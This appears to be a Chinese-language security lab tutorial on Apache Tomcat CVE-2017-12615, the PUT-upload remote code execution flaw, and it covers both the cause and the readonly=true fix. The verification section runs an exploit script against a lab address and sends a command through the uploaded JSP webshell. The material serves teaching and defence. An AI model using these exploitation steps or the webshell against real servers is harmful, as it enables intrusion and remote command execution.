# Tomcat远程代码执行漏洞危害

## 工具

Firefox: 中文俗称火狐，一个自由及开放源代码网页浏览器

## Tomcat

Tomcat服务器是一个免费的开放源代码的Web应用服务器。Tomcat是Apache软件基金会（Apache SoftwareFoundation）的Jakarta项目中的一个核心项目，由Apache、Sun和其他一些公司及个人共同开发而成。

## 漏洞介绍

2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT请求方法，攻击者通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行，危害十分严重。

## 漏洞分析

在Tomcat安装目录下的配置文件web.xml中的org.apache.catalina.servlets.DefaultServlet方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法

    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>


然后我们就可以通过PUT方法直接上传一句话木马

## 修复方案

用户可以禁用PUT方法来防护此漏洞，操作方式如下：

在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数

    <init-param>
    <param-name>readonly</param-name>
    <param-value>true</param-value>
    </init-param>

确保readonly参数为true（默认值），即不允许DELETE和PUT操作。

## 验证步骤

步骤 1：访问目标网站

在浏览器的地址栏输入我们的目标网站地址192.168.1.1:8080，查看版本知道存在远程代码执行漏洞；

步骤 2：执行payload，利用payload对目标网站发起攻击。输入命令:

    python exp.py 192.168.1.1:8080

运行，程序返回webshell的地址

    http://192.168.1.1:8080/1506412001.jsp

注意：此处1506412001.jsp为随机生成地址，请以实际获取的shell为准

在火狐浏览器中按F9打开hackbar插件，执行以下命令

    http://192.168.1.1:8080/1506412001.jsp?&pwd=023&cmd=ipconfig

## 结果分析
当存在漏洞的Tomcat运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。因此，通常情况下我们应该不允许DELETE和PUT操作。